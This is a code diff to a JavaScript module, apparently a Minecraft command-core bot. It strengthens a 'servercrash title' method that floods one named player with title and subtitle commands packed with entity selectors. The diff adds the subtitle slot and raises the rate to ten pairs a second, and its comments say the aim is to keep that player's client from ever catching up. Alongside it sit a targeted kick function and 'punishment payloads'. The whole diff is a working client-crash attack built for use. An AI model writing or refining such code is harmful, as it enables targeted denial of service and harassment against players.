@@ -42,15 +42,21 @@ const KICK_DEFAULT = 2e9;
 // the title is rendered, so one `/title <player> title` packet asks the server
 // for `count` of them at once. The packet goes to that player alone, so only
 // their client builds the oversized title and the rest of the list never sees
-// it.
+// it. The same component goes into both slots, title and subtitle, so the client
+// builds two oversized components per packet pair instead of one.
 const TITLE_HEAD = 'title {t} title {"text":"phantomSLAY","color":"#ffccee","extra":[';
+const SUBTITLE_HEAD = 'title {t} subtitle {"text":"phantomSLAY","color":"#ffccee","extra":[';
 const TITLE_TAIL = ']}';
 const ENTITY_SELECTOR = '{"selector":"@e[limit=100]"}';
 const TITLE_DEFAULT = 900;
 
-// Four packets a second while the player is still online: enough that the next
-// one is already queued when the client falls behind on the last, slow enough to
-// stay inside the core's write budget.
+// Ten title/subtitle pairs a second while the player is still online: the client
+// never finishes laying out one pair before the next is in its queue.
+const TITLE_INTERVAL_MS = 100;
+
+// Four particle packets a second for the punishment payloads: enough that the
+// next one is already queued when the client falls behind on the last, slow
+// enough to stay inside the core's write budget.
 const KICK_INTERVAL_MS = 250;
 
 function targetedKick(name, count) {
@@ -63,23 +69,31 @@ function targetedKick(name, count) {
     return KICK_TEMPLATE.replaceAll('{t}', target).replaceAll('{n}', String(value));
 }
 
-// The `servercrash title` method, aimed at one name. Each selector costs its own
-// length plus the comma before it, so the count is clamped to what still fits a
-// single core command: core.run() slices at 32000 characters, which would cut a
-// long component into invalid JSON.
+// The `servercrash title` method, aimed at one name: the title and its subtitle,
+// as the two commands that carry them. Each selector costs its own length plus
+// the comma before it, so the count is clamped to what still fits one core
+// command: core.run() slices at 32000 characters, which would cut a long
+// component into invalid JSON. Each slot is its own command, so each gets the
+// whole limit.
+function titleCommand(head, value) {
+    return `${head}${new Array(value).fill(ENTITY_SELECTOR).join(',')}${TITLE_TAIL}`;
+}
+
 function targetedTitle(name, count) {
     const target = String(name || '').trim();
     if (!target) return null;
 
-    const head = TITLE_HEAD.replaceAll('{t}', target);
+    const heads = [TITLE_HEAD, SUBTITLE_HEAD].map(head => head.replaceAll('{t}', target));
     const requested = Math.floor(Number(count));
-    const room = COMMAND_LIMIT - head.length - TITLE_TAIL.length + 1;
-    const fits = Math.floor(room / (ENTITY_SELECTOR.length + 1));
+    const room = COMMAND_LIMIT - TITLE_TAIL.length + 1;
+    const fits = Math.min(
+        ...heads.map(head => Math.floor((room - head.length) / (ENTITY_SELECTOR.length + 1)))
+    );
     const asked = Number.isFinite(requested) && requested > 0 ? requested : TITLE_DEFAULT;
     const value = Math.min(asked, fits);
     if (value < 1) return null;
 
-    return `${head}${new Array(value).fill(ENTITY_SELECTOR).join(',')}${TITLE_TAIL}`;
+    return heads.map(head => titleCommand(head, value));
 }
 
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
@@ -174,6 +188,7 @@ module.exports = {
     targetedKick,
     targetedTitle,
     TITLE_DEFAULT,
+    TITLE_INTERVAL_MS,
     KICK_INTERVAL_MS,
     SEED_LENGTH,
     BYTES_PER_CHAR,
